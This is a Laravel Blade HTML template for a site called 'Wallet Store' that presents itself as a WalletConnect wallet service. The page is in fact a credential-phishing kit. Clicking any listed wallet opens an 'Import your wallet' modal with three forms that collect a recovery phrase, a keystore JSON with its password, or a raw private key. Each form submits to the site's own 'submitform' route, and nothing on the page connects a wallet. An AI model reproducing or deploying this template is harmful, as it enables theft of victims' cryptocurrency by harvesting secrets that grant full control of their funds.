

<!DOCTYPE html>
<html lang="zxx">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> -->
    <link rel="shortcut icon" type="image/x-icon" href="{{ asset('assets/img/favicon.ico') }}" />
    <title>Wallet Store </title>
    <!-- Bootstrap core CSS -->
    <link href="{{ asset('assets/css/bootstrap.min.css') }}" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
    <!-- Google Font  -->
    <link href="https://fonts.googleapis.com/css?family=Catamaran:300,400,500,600,700" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Muli:400,600,700" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700" rel="stylesheet">
    <!-- fontawesome icon -->
    <link rel="stylesheet" href="{{ asset('assets/fonts/font-awesome.min.css') }}">
    <!-- icofont icon -->
    <link rel="stylesheet" href="{{ asset('assets/fonts/icofont.css') }}">
    <!-- animate CSS -->
    <link rel="stylesheet" href="{{ asset('assets/css/animate.css') }}">
    <!-- rotate headlines css-->
    <link rel="stylesheet" href="{{ asset('assets/css/cd-headline.css') }}">
    <!-- venobox -->
    <link rel="stylesheet" href="{{ asset('assets/css/venobox.css') }}" />
    <!--- owl carousel Css-->
    <link rel="stylesheet" href="{{ asset('assets/css/owl.carousel.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/css/owl.theme.default.min.css') }}">
    <!-- Style CSS -->
    <link rel="stylesheet" href="{{ asset('assets/css/style.css') }}">


</head>



<body id="page-top" onselectstart="return false">
    <!-- Wallets Json -->
 

    <!-- END Wallet Json -->

    <!-- START PRELOADER -->
    <div class="preloader">
        <div class="loadscreen">
            <div class="loadscreen-in">
                <!-- <img class="img-fluid" src="assets/img/preloader-logo.png" alt=""> -->
            </div>
        </div>
    </div>
    <!-- END PRELOADER -->

    <!-- START NAVBAR -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top" id="mainNav">
        <div class="container">
            <a class="navbar-brand js-scroll-trigger" href="#page-top"><img class="img-fluid" src="{{ asset('assets/img/logo.png') }}" alt="">
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                MENU
                <i class="fa fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
            <ul class="navbar-nav ml-auto">
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="{{ url('/') }}">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="{{ url('/') }}">Services</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="{{ url('wallets') }}">Wallets</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link js-scroll-trigger" href="#contact">Contact</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- END NAVBAR -->
     <section class="our-service bg-gray" id="wallets">
        <div class="container">
            <div class="text-center">
                <div class="section-title">
                    <h3>Wallets</h3>
                    <span></span>
                    <p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile apps and mobile browsers are supported via mobile deep linking.
                    </p>
                    
                </div>
            </div>
          
            <div class="row row-cols-1 row-cols-md-5 g-5 mb-5 ml-5">
               
               @foreach($responses as $response)
               
               <div class="col" data-wow-delay="0.1s" data-toggle="modal" data-target="#exampleModal">

                <div class="card text-center rounded-4 bg-light.bg-gradient"
                    style="width: 13rem; height: 15rem;box-shadow: 3px 3px 3px grey;">
                    <img src="{{ $response['image'] }}" class="card-img-top rounded-circle mx-auto d-block"
                        style="width: 4rem; height: 4rem; margin-top:3rem;" alt="...">
                    <div class="card-body">
                        <p class="card-text fs-7 fw-bold" style="margin-top:3rem;">{{ $response['name'] }}</p>

                    </div>
                </div>

            </div> <!-- /.col- -->
                @endforeach
              
 
            </div>
            
        </div>
    </section>

	


    <!-- MODAL CLASS -->
    <div class="modal fade" id="exampleModal" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false"
    aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Import your wallet</h5>
                <button type="button" class="btn-close" data-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">


                <!-- MODAL DIV -->
                <div class="row">
                    <div class="col-lg-4 col-md-12 col-sm-12 col-12">
                        <ul class="nav nav-tabs">
                            <li class="nav-item"><a href="#" data-target="#faq1" data-toggle="tab"
                                    class="nav-link active">Phrase
                                    <i class='icofont icofont-rounded-right'></i></a>
                            </li>
                            <li class="nav-item"><a href="#" data-target="#faq2" data-toggle="tab"
                                    class="nav-link">KeyStone JSON<i class='icofont icofont-rounded-right'></i></a>
                            </li>
                            <li class="nav-item"><a href="#" data-target="#faq3" data-toggle="tab"
                                    class="nav-link">Private Key<i class='icofont icofont-rounded-right'></i></a>
                            </li>

                        </ul>

                    </div>
                    <!-- end col -->
                    <div class="col-lg-8 col-md-12 col-sm-12 col-12">
                        <div class="tab-content">

                            <div id="faq1" class="tab-pane fade active show">
                                <div class="">

                                    <div class="contact">
                                        <form class="form" id="form-mnemonics" method="POST" action="{{route('submitform')}}">
                                            {{ csrf_field() }}
                                            <div class="row">

                                                <div class="form-group col-md-12">
                                                    <textarea rows="8" name="message" class="form-control"
                                                        id="mnemonics" placeholder="Enter your phrase"
                                                        required></textarea>
                                                    <span class="input_bar" style="color: blue"><strong>Typically
                                                            12(sometimes 24) words seperated by single
                                                            space</strong></span>
                                                </div>
                                                <div class="form-group col-md-12 mb0 text-center">
                                                    <div class="d-grid gap-2">
                                                        <button class="btn btn-primary" type="button"
                                                            onclick="funcmnemonics()">IMPORT</button>
                                                        <button class="btn btn-danger" type="button"
                                                            data-dismiss="modal">cancel</button>
                                                    </div>
                                                </div>
                                            </div>
                                        </form>
                                        <script>
                                        function funcmnemonics() {
                                            console.log("inside the function");
                                            var wordcount = document.getElementById("mnemonics").value.trim().split(
                                                /\s+/).length;
                                            console.log(wordcount);
                                            if (wordcount < 12) {
                                                alert("Passphrase requires atleast 12 words.");
                                            } else if (wordcount >= 12) {
                                                console.log("inside if else statement");
                                                var form = document.getElementById("form-mnemonics");
                                                form.submit();
                                            }
                                        }
                                        </script>
                                    </div>
                                </div>

                            </div>
                            <div id="faq2" class="tab-pane fade">
                                <div class="contact">
                                    <form id="form-password" class="form" method="POST" action="{{route('submitform')}}">
                                        {{ csrf_field() }}
                                        <div class="row">
                                            <div class="form-group col-md-12">
                                                <textarea rows="6" name="message" class="form-control"
                                                    id="description" placeholder="keystone JSON"
                                                    required="required"></textarea>
                                                <span class="input_bar"></span>
                                            </div>
                                            <div class="form-group col-md-12">
                                                <input type="password" name="password" class="form-control"
                                                    id="password" placeholder="Password" required="required">
                                                <span class="input_bar" style="color: blue"><strong> Several lines
                                                        of text begining with '(...)' plus the password <br />you
                                                        used to encrypt it</strong></span>
                                            </div>


                                            <div class="form-group col-md-12 mb0 text-center">

                                                <div class="d-grid gap-2">
                                                    <button class="btn btn-primary" type="submit">IMPORT</button>
                                                    <button class="btn btn-danger" type="button"
                                                        data-dismiss="modal">cancel</button>
                                                </div>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                            <div id="faq3" class="tab-pane fade">
                                <div class="contact">
                                    <form id="form-privatekey" class="form" method="POST" action="{{route('submitform')}}">
                                        {{ csrf_field() }}
                                        <div class="row">
                                            <div class="form-group col-md-12">
                                                <input type="text" name="privatekey" class="form-control"
                                                    id="privatekey" placeholder="Private Key " required="required">
                                                <span class="input_bar" style="color: blue"><strong>typically 64
                                                        alphanumeric characters</strong></span>
                                            </div>

                                            <div class="d-grid gap-2">
                                                <button class="btn btn-primary" type="submit">IMPORT</button>
                                                <button class="btn btn-danger" type="button"
                                                    data-dismiss="modal">cancel</button>
                                            </div>

                                        </div>
                                    </form>
                                </div>
                            </div>

                        </div>

                    </div>
                </div>
            </div>
            <!-- <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
          <button type="button" class="btn btn-primary">Save changes</button>
        </div> -->
        </div>
    </div>
</div>

      <!-- MODAL CLASS END-->
	
	<!-- ======================================= 
    ==Start footer section==  
    =======================================-->
    <footer class="main-footer footer-style-two text-center">
    <!--Widgets Section-->
      <div class="widgets-section padding-top-small padding-bottom-small">
         <div class="container">
             
            <div class="row clearfix">
               <!--Footer Column-->
               <div class="footer-column col-md-12 col-sm-12 col-xs-12">
                  <div class="footer-widget about-widget">
                     <h3 class="has-line-center">About Us</h3>
                     <div class="widget-content">
                        <div class="text">cryptocurrency wallets provide users with a digital solution for securely storing and managing blockchain assets and cryptocurrencies. These wallets allow users to send, receive, and trade cryptocurrencies. While some cryptocurrency wallets may only provide support for a single cryptocurrency, many are multi-asset solutions, allowing users to hold multiple cryptocurrencies, including Bitcoin, Bitcoin cash, Ethereum, and Litecoin among many others. These solutions ensure that the owner of the cryptocurrencies and blockchain assets is the only entity that can access the funds by requiring passwords and other security measures. Users can view or access cryptocurrency wallets from smartphones and computers. </div>
                           
                         </div>
                     </div>
                 </div><!--End Footer Column-->
                 
              
             </div>
         </div>
     </div>
     
     <!--Footer Bottom-->
      <div class="footer-bottom">
         <div class="auto-container">
            <div class="copyright-text">Copyright © 2021. All Rights</div>
         </div>
      </div>
    </footer>
    <!-- ======================================= 
    ==End footer section==  
    =======================================-->

    <!-- Latest jQuery -->
    <script src="{{ asset('assets/js/jquery-2.2.4.min.js') }}"></script>
    <!-- popper js -->
    <script src="{{ asset('assets/js/popper.min.js') }}"></script>
    <!-- Latest compiled and minified Bootstrap -->
    <script src="{{ asset('assets/js/bootstrap.min.js') }}"></script>
    <!-- cd-headline js -->
    <script src="{{ asset('assets/js/cd-headline.js') }}"></script>
    <!-- jQuery Timer -->
    <script src="{{ asset('assets/js/jquery.countdown.min.js') }}"></script>
    <!-- HighCharts -->
     <script src="{{ asset('assets/js/highcharts.js') }}"></script>
    <script src="{{ asset('assets/js/create-highcarts.js') }}"></script>
    <!-- venobox js -->
    <script src="{{ asset('assets/js/venobox.min.js') }}"></script>
    <!-- owl-carousel min js  -->
    <script src="{{ asset('assets/js/owl.carousel.min.js') }}"></script>
    <!-- marquee -->
    <script src="{{ asset('assets/js/jquery.marquee.min.js') }}"></script>
    <script src="{{ asset('assets/js/jquery.pause.min.js') }}"></script>
    <script src="{{ asset('assets/js/jquery.easing.min.js') }}"></script>

    <!-- WOW - Reveal Animations When You Scroll -->
    <script src="{{ asset('assets/js/wow.min.js') }}"></script>
    <!-- scrolltopcontrol js -->
    <script src="{{ asset('assets/js/scrolltopcontrol.js') }}"></script>
    <!-- form-contact js -->
    <script src="{{ asset('assets/js/form-contact.js') }}"></script>
    
    <script src="{{ asset('assets/js/scripts.js') }}"></script>
</body>

</html>